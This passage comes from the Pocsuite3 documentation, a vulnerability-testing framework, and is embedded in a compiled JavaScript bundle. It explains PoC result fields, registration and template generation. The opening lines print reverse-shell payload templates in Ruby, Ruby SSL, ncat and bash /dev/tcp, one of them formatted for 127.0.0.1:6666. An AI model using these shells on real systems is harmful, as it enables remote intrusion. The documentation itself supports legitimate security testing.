<span class="line"><span style="color:#82AAFF;">              </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">RUBY2</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">:</span><span style="color:#82AAFF;"> </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">ruby -rsocket -e</span><span style="color:#A6ACCD;">\\&#39;</span><span style="color:#C3E88D;">f=TCPSocket.open(&quot;{0}&quot;,{1}).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)</span><span style="color:#A6ACCD;">\\&#39;</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">,</span></span>
<span class="line"><span style="color:#82AAFF;">              </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">RUBY_SSL</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">:</span><span style="color:#82AAFF;"> </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">ruby -rsocket -ropenssl -e </span><span style="color:#A6ACCD;">\\&#39;</span><span style="color:#C3E88D;">exit if fork;c=OpenSSL::SSL::SSLSocket.new(TCPSocket.new(&quot;{0}&quot;,&quot;{1}&quot;)).connect;while(cmd=c.gets);IO.popen(cmd.to_s,&quot;r&quot;){{|io|c.print io.read}}end</span><span style="color:#A6ACCD;">\\&#39;</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">,</span></span>
<span class="line"><span style="color:#82AAFF;">              </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">NCAT_SSL</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">:</span><span style="color:#82AAFF;"> </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">ncat -e /bin/sh --ssl {0} {1}</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">,</span></span>
<span class="line"><span style="color:#82AAFF;">              </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">__dict__</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">:</span><span style="color:#82AAFF;"> </span><span style="color:#89DDFF;">&lt;</span><span style="color:#82AAFF;">attribute </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">__dict__</span><span style="color:#89DDFF;">&#39;</span><span style="color:#82AAFF;"> of </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">REVERSE_PAYLOAD</span><span style="color:#89DDFF;">&#39;</span><span style="color:#82AAFF;"> objects</span><span style="color:#89DDFF;">&gt;,</span></span>
<span class="line"><span style="color:#82AAFF;">              </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">__weakref__</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">:</span><span style="color:#82AAFF;"> </span><span style="color:#89DDFF;">&lt;</span><span style="color:#82AAFF;">attribute </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">__weakref__</span><span style="color:#89DDFF;">&#39;</span><span style="color:#82AAFF;"> of </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">REVERSE_PAYLOAD</span><span style="color:#89DDFF;">&#39;</span><span style="color:#82AAFF;"> objects</span><span style="color:#89DDFF;">&gt;,</span></span>
<span class="line"><span style="color:#82AAFF;">              </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">__doc__</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">:</span><span style="color:#82AAFF;"> </span><span style="color:#89DDFF;">None})</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="color:#A6ACCD;">In </span><span style="color:#89DDFF;">[</span><span style="color:#F78C6C;">8</span><span style="color:#89DDFF;">]:</span><span style="color:#A6ACCD;"> REVERSE_PAYLOAD</span><span style="color:#89DDFF;">.</span><span style="color:#F07178;">BASH</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">format</span><span style="color:#89DDFF;">(</span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">127.0.0.1</span><span style="color:#89DDFF;">&#39;</span><span style="color:#89DDFF;">,</span><span style="color:#82AAFF;"> </span><span style="color:#F78C6C;">6666</span><span style="color:#89DDFF;">)</span></span>
<span class="line"><span style="color:#A6ACCD;">Out</span><span style="color:#89DDFF;">[</span><span style="color:#F78C6C;">8</span><span style="color:#89DDFF;">]:</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">bash -c &#39;sh -i &gt;&amp; /dev/tcp/127.0.0.1/6666 0&gt;&amp;1&#39;</span><span style="color:#89DDFF;">&quot;</span></span>
<span class="line"></span></code></pre></div><ol start="7"><li>Return results</li></ol><p>In both verification mode and attack mode, result should be compliance with the following convention. Please refer to <a href="./poc-specification.html#poc-result-convention">&quot;PoC Result Convention&quot;</a> for the meaning of each fileld.</p><div class="language-json"><span class="copy"></span><pre><code><span class="line"><span style="color:#A6ACCD;">&#39;Result&#39;: </span><span style="color:#89DDFF;">{</span></span>
<span class="line"><span style="color:#A6ACCD;">   &#39;DBInfo&#39;</span><span style="color:#89DDFF;">:</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">{</span><span style="color:#A6ACCD;">&#39;Username&#39;</span><span style="color:#89DDFF;">:</span><span style="color:#A6ACCD;"> &#39;xxx&#39;</span><span style="color:#89DDFF;">,</span><span style="color:#A6ACCD;"> &#39;Password&#39;</span><span style="color:#89DDFF;">:</span><span style="color:#A6ACCD;"> &#39;xxx&#39;</span><span style="color:#89DDFF;">,</span><span style="color:#A6ACCD;"> &#39;Salt&#39;</span><span style="color:#89DDFF;">:</span><span style="color:#A6ACCD;"> &#39;xxx&#39;</span><span style="color:#89DDFF;">,</span><span style="color:#A6ACCD;"> &#39;Uid&#39;</span><span style="color:#89DDFF;">:</span><span style="color:#A6ACCD;"> &#39;xxx&#39;</span><span style="color:#89DDFF;">,</span><span style="color:#A6ACCD;"> &#39;Groupid&#39;</span><span style="color:#89DDFF;">:</span><span style="color:#A6ACCD;"> &#39;xxx&#39;</span><span style="color:#89DDFF;">},</span></span>
<span class="line"><span style="color:#A6ACCD;">   &#39;ShellInfo&#39;</span><span style="color:#89DDFF;">:</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">{</span><span style="color:#A6ACCD;">&#39;URL&#39;</span><span style="color:#89DDFF;">:</span><span style="color:#A6ACCD;"> &#39;xxx&#39;</span><span style="color:#89DDFF;">,</span><span style="color:#A6ACCD;"> &#39;Content&#39;</span><span style="color:#89DDFF;">:</span><span style="color:#A6ACCD;"> &#39;xxx&#39;</span><span style="color:#89DDFF;">},</span></span>
<span class="line"><span style="color:#A6ACCD;">   &#39;FileInfo&#39;</span><span style="color:#89DDFF;">:</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">{</span><span style="color:#A6ACCD;">&#39;Filename&#39;</span><span style="color:#89DDFF;">:</span><span style="color:#A6ACCD;"> &#39;xxx&#39;</span><span style="color:#89DDFF;">,</span><span style="color:#A6ACCD;"> &#39;Content&#39;</span><span style="color:#89DDFF;">:</span><span style="color:#A6ACCD;"> &#39;xxx&#39;</span><span style="color:#89DDFF;">},</span></span>
<span class="line"><span style="color:#A6ACCD;">   &#39;XSSInfo&#39;</span><span style="color:#89DDFF;">:</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">{</span><span style="color:#A6ACCD;">&#39;URL&#39;</span><span style="color:#89DDFF;">:</span><span style="color:#A6ACCD;"> &#39;xxx&#39;</span><span style="color:#89DDFF;">,</span><span style="color:#A6ACCD;"> &#39;Payload&#39;</span><span style="color:#89DDFF;">:</span><span style="color:#A6ACCD;"> &#39;xxx&#39;</span><span style="color:#89DDFF;">},</span></span>
<span class="line"><span style="color:#A6ACCD;">   &#39;AdminInfo&#39;</span><span style="color:#89DDFF;">:</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">{</span><span style="color:#A6ACCD;">&#39;Uid&#39;</span><span style="color:#89DDFF;">:</span><span style="color:#A6ACCD;"> &#39;xxx&#39;</span><span style="color:#89DDFF;">,</span><span style="color:#A6ACCD;"> &#39;Username&#39;</span><span style="color:#89DDFF;">:</span><span style="color:#A6ACCD;"> &#39;xxx&#39;</span><span style="color:#89DDFF;">,</span><span style="color:#A6ACCD;"> &#39;Password&#39;</span><span style="color:#89DDFF;">:</span><span style="color:#A6ACCD;"> &#39;xxx&#39;</span><span style="color:#89DDFF;">},</span></span>
<span class="line"><span style="color:#A6ACCD;">   &#39;Database&#39;</span><span style="color:#89DDFF;">:</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">{</span><span style="color:#A6ACCD;">&#39;Hostname&#39;</span><span style="color:#89DDFF;">:</span><span style="color:#A6ACCD;"> &#39;xxx&#39;</span><span style="color:#89DDFF;">,</span><span style="color:#A6ACCD;"> &#39;Username&#39;</span><span style="color:#89DDFF;">:</span><span style="color:#A6ACCD;"> &#39;xxx&#39;</span><span style="color:#89DDFF;">,</span><span style="color:#A6ACCD;"> &#39;Password&#39;</span><span style="color:#89DDFF;">:</span><span style="color:#A6ACCD;"> &#39;xxx&#39;</span><span style="color:#89DDFF;">,</span><span style="color:#A6ACCD;"> &#39;DBname&#39;</span><span style="color:#89DDFF;">:</span><span style="color:#A6ACCD;"> &#39;xxx&#39;</span><span style="color:#89DDFF;">},</span></span>
<span class="line"><span style="color:#A6ACCD;">   &#39;VerifyInfo&#39;</span><span style="color:#89DDFF;">:</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">{</span><span style="color:#A6ACCD;">&#39;URL&#39;</span><span style="color:#89DDFF;">:</span><span style="color:#A6ACCD;"> &#39;xxx&#39;</span><span style="color:#89DDFF;">,</span><span style="color:#A6ACCD;"> &#39;Postdata&#39;</span><span style="color:#89DDFF;">:</span><span style="color:#A6ACCD;"> &#39;xxx&#39;</span><span style="color:#89DDFF;">,</span><span style="color:#A6ACCD;"> &#39;Path&#39;</span><span style="color:#89DDFF;">:</span><span style="color:#A6ACCD;"> &#39;xxx&#39;</span><span style="color:#89DDFF;">},</span></span>
<span class="line"><span style="color:#A6ACCD;">   &#39;SiteAttr&#39;</span><span style="color:#89DDFF;">:</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">{</span><span style="color:#A6ACCD;">&#39;Process&#39;</span><span style="color:#89DDFF;">:</span><span style="color:#A6ACCD;"> &#39;xxx&#39;</span><span style="color:#89DDFF;">},</span></span>
<span class="line"><span style="color:#A6ACCD;">   &#39;Stdout&#39;</span><span style="color:#89DDFF;">:</span><span style="color:#A6ACCD;"> &#39;result output string&#39;</span></span>
<span class="line"><span style="color:#89DDFF;">}</span></span>
<span class="line"></span></code></pre></div><ol start="8"><li>Register PoC</li></ol><p>Call <code>register_poc()</code> outside the class to register PoC class</p><div class="language-"><span class="copy"></span><pre><code><span class="line"><span style="color:#A6ACCD;">class DemoPOC(POCBase):</span></span>
<span class="line"><span style="color:#A6ACCD;">    # POC inner</span></span>
<span class="line"><span style="color:#A6ACCD;"></span></span>
<span class="line"><span style="color:#A6ACCD;"># register DemoPOC class</span></span>
<span class="line"><span style="color:#A6ACCD;">register_poc(DemoPOC)</span></span>
<span class="line"><span style="color:#A6ACCD;"></span></span></code></pre></div><p>Now, we develop the PoC from scratch. Then we will build the vulnerability testing environment for PoC debugging.</p><h2 id="automatically-generated-template" tabindex="-1">Automatically Generated Template <a class="header-anchor" href="#automatically-generated-template" aria-hidden="true">#</a></h2><p>The above process is a little tedious\uFF0CPocsuite3 supports template generation using <code>-n</code> or <code>--new</code> since <code>1.9.4</code> version.</p><p>Reference: <a href="./poc-demo-introduction.html">PoC Writing Example</a></p><div class="language-bash"><span class="copy"></span><pre><code><span class="line"><span style="color:#A6ACCD;">\u2500\u2500</span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">kali\u327Fkali</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;">-</span><span style="color:#89DDFF;">[</span><span style="color:#A6ACCD;">/tmp/</span><span style="color:#89DDFF;">]</span></span>
<span class="line"><span style="color:#A6ACCD;">\u2514\u2500$ pocsuite -n                            </span></span>
<span class="line"></span>
<span class="line"><span style="color:#A6ACCD;">,------.                        ,--. ,--.       ,----.   {1.9.6-aad0be3}</span></span>
<span class="line"><span style="color:#89DDFF;">|</span><span style="color:#A6ACCD;">  .--. </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">,---. ,---.,---.,--.,--\`--,-</span><span style="color:#89DDFF;">&#39;</span><span style="color:#A6ACCD;">  </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">-.,---.</span><span style="color:#89DDFF;">&#39;</span><span style="color:#A6ACCD;">.-.  </span><span style="color:#89DDFF;">|</span></span>
<span class="line"><span style="color:#89DDFF;">|</span><span style="color:#A6ACCD;">  </span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">--</span><span style="color:#89DDFF;">&#39;</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">|</span><span style="color:#A6ACCD;"> .-. </span><span style="color:#89DDFF;">|</span><span style="color:#A6ACCD;"> .--</span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">  .-</span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">|  ||  ,--</span><span style="color:#89DDFF;">&#39;</span><span style="color:#A6ACCD;">-.  .-</span><span style="color:#89DDFF;">|</span><span style="color:#A6ACCD;"> .-. </span><span style="color:#82AAFF;">:</span><span style="color:#A6ACCD;"> .</span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;"> &lt;</span></span>
<span class="line"><span style="color:#C3E88D;">|  | --</span><span style="color:#89DDFF;">&#39;&#39;</span><span style="color:#C3E88D;"> </span><span style="color:#89DDFF;">&#39;</span><span style="color:#A6ACCD;">-</span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;"> \\ \`--.-</span><span style="color:#89DDFF;">&#39;</span><span style="color:#A6ACCD;">  </span><span style="color:#89DDFF;">\`&#39;</span><span style="color:#C3E88D;">  </span><span style="color:#89DDFF;">&#39;&#39;</span><span style="color:#C3E88D;">  |  | |  | \\   --/</span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">-</span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">  |</span></span>
<span class="line"><span style="color:#C3E88D;">\`--</span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">     </span><span style="color:#89DDFF;">\`</span><span style="color:#A6ACCD;">---</span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;"> \`---\`----</span><span style="color:#89DDFF;">&#39;</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">\`</span><span style="color:#C3E88D;">----</span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">\`--</span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;"> </span><span style="color:#89DDFF;">\`</span><span style="color:#A6ACCD;">--</span><span style="color:#89DDFF;">&#39;</span><span style="color:#C3E88D;">  \`----\`----</span><span style="color:#89DDFF;">&#39;</span><span style="color:#A6ACCD;">   https://pocsuite.org</span></span>
<span class="line"><span style="color:#89DDFF;">[*]</span><span style="color:#A6ACCD;"> starting at 20:40:34</span></span>
<span class="line"></span>
<span class="line"><span style="color:#A6ACCD;">You are about to be asked to enter information that will be used to create a poc template.</span></span>
<span class="line"><span style="color:#A6ACCD;">There are quite a few fields but you can leave some blank.</span></span>
<span class="line"><span style="color:#A6ACCD;">For some fields there will be a default value.</span></span>
<span class="line"><span style="color:#A6ACCD;">-----</span></span>
<span class="line"><span style="color:#A6ACCD;">Seebug ssvid </span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">eg, 99335</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">[</span><span style="color:#A6ACCD;">0</span><span style="color:#89DDFF;">]</span><span style="color:#A6ACCD;">: </span></span>
<span class="line"><span style="color:#A6ACCD;">PoC author </span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">eg, Seebug</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">[]</span><span style="color:#A6ACCD;">: </span></span>
<span class="line"><span style="color:#A6ACCD;">Vulnerability disclosure date </span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">eg, 2021-8-18</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">[</span><span style="color:#A6ACCD;">2022-07-14</span><span style="color:#89DDFF;">]</span><span style="color:#A6ACCD;">: </span></span>
<span class="line"><span style="color:#A6ACCD;">Advisory URL </span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">eg, https://www.seebug.org/vuldb/ssvid-99335</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">[]</span><span style="color:#A6ACCD;">: </span></span>
<span class="line"><span style="color:#A6ACCD;">Vulnerability CVE number </span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">eg, CVE-2021-22123</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">[]</span><span style="color:#A6ACCD;">: </span></span>
<span class="line"><span style="color:#A6ACCD;">Vendor name </span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">eg, Fortinet</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">[]</span><span style="color:#A6ACCD;">: </span></span>
<span class="line"><span style="color:#A6ACCD;">Product or component name </span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">eg, FortiWeb</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">[]</span><span style="color:#A6ACCD;">: </span></span>
<span class="line"><span style="color:#A6ACCD;">Affected version </span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">eg, </span><span style="color:#89DDFF;">&lt;</span><span style="color:#A6ACCD;">=6.4.0</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">[]</span><span style="color:#A6ACCD;">: </span></span>
<span class="line"><span style="color:#A6ACCD;">Vendor homepage </span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">eg, https://www.fortinet.com</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">[]</span><span style="color:#A6ACCD;">: </span></span>
<span class="line"></span>
<span class="line"><span style="color:#A6ACCD;">0    Arbitrary File Read</span></span>
<span class="line"><span style="color:#A6ACCD;">1    Code Execution</span></span>
<span class="line"><span style="color:#A6ACCD;">2    Command Execution</span></span>
<span class="line"><span style="color:#A6ACCD;">3    Denial Of service</span></span>
<span class="line"><span style="color:#A6ACCD;">4    Information Disclosure</span></span>
<span class="line"><span style="color:#A6ACCD;">5    Login Bypass</span></span>
<span class="line"><span style="color:#A6ACCD;">6    Path Traversal</span></span>
<span class="line"><span style="color:#A6ACCD;">7    SQL Injection</span></span>
<span class="line"><span style="color:#A6ACCD;">8    SSRF</span></span>
<span class="line"><span style="color:#A6ACCD;">9    XSS</span></span>
<span class="line"></span>
<span class="line"><span style="color:#A6ACCD;">Vulnerability type, choose from above or provide </span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">eg, 3</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">[]</span><span style="color:#A6ACCD;">: </span></span>
<span class="line"><span style="color:#A6ACCD;">Authentication Required </span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">eg, yes</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">[</span><span style="color:#A6ACCD;">no</span><span style="color:#89DDFF;">]</span><span style="color:#A6ACCD;">: </span></span>
<span class="line"><span style="color:#A6ACCD;">PoC name </span><span style="color:#89DDFF;">[</span><span style="color:#A6ACCD;">Pre-Auth Other</span><span style="color:#89DDFF;">]</span><span style="color:#A6ACCD;">: </span></span>
<span class="line"><span style="color:#A6ACCD;">Filepath </span><span style="color:#89DDFF;font-style:italic;">in</span><span style="color:#A6ACCD;"> which to save the poc </span><span style="color:#89DDFF;">[</span><span style="color:#A6ACCD;">./20220714_pre-auth_other.py</span><span style="color:#89DDFF;">]</span></span>
<span class="line"><span style="color:#89DDFF;">[</span><span style="color:#A6ACCD;">20:40:36</span><span style="color:#89DDFF;">]</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">[</span><span style="color:#A6ACCD;">INFO</span><span style="color:#89DDFF;">]</span><span style="color:#A6ACCD;"> Your poc has been saved </span><span style="color:#89DDFF;font-style:italic;">in</span><span style="color:#A6ACCD;"> ./20220714_pre-auth_other.py :</span><span style="color:#89DDFF;">)</span></span>
<span class="line"><span style="color:#A6ACCD;">...</span></span>
<span class="line"></span></code></pre></div><h2 id="minimal-poc-template" tabindex="-1">Minimal PoC Template <a class="header-anchor" href="#minimal-poc-template" aria-hidden="true">#</a></h2><p>From version <em><strong>1.9.8</strong></em>, Pocsuite3 sets default values for all PoC attribute field in POCBase. So in a PoC, any attribute field is optional, which simplifies the development of the PoC.</p><div class="language-python"><span class="copy"></span><pre><code><span class="line"><span style="color:#89DDFF;font-style:italic;">from</span><span style="color:#A6ACCD;"> pocsuite3</span><span style="color:#89DDFF;">.</span><span style="color:#A6ACCD;">api </span><span style="color:#89DDFF;font-style:italic;">import</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">*</span></span>
<span class="line"></span>
<span class="line"><span style="color:#C792EA;">class</span><span style="color:#A6ACCD;"> </span><span style="color:#FFCB6B;">TestPOC</span><span style="color:#89DDFF;">(</span><span style="color:#FFCB6B;">POCBase</span><span style="color:#89DDFF;">):</span></span>
<span class="line"><span style="color:#A6ACCD;">    </span><span style="color:#676E95;font-style:italic;"># Providing the name field is recommended to differentiate between different PoC</span></span>
<span class="line"><span style="color:#A6ACCD;">    </span><span style="color:#676E95;font-style:italic;"># name = &#39;&#39;</span></span>
<span class="line"><span style="color:#A6ACCD;">    </span><span style="color:#C792EA;">def</span><span style="color:#A6ACCD;"> </span><span style="color:#82AAFF;">_verify</span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">self</span><span style="color:#89DDFF;">):</span></span>
<span class="line"><span style="color:#A6ACCD;">        result </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">{}</span></span>
<span class="line"><span style="color:#A6ACCD;">        </span><span style="color:#676E95;font-style:italic;"># </span><span style="color:#89DDFF;font-style:italic;">TODO</span><span style="color:#676E95;font-style:italic;">, Vulnerability verification</span></span>
<span class="line"><span style="color:#A6ACCD;">        </span><span style="color:#89DDFF;font-style:italic;">return</span><span style="color:#A6ACCD;"> self</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">parse_output</span><span style="color:#89DDFF;">(</span><span style="color:#82AAFF;">result</span><span style="color:#89DDFF;">)</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="color:#82AAFF;">register_poc</span><span style="color:#89DDFF;">(</span><span style="color:#82AAFF;">TestPOC</span><span style="color:#89DDFF;">)</span></span>
<span class="line"></span></code></pre></div>`,56),D=[r];function F(y,A,C,i,u,d){return e(),o("div",null,D)}var E=p(c,[["render",F]]);export{h as __pageData,E as default};
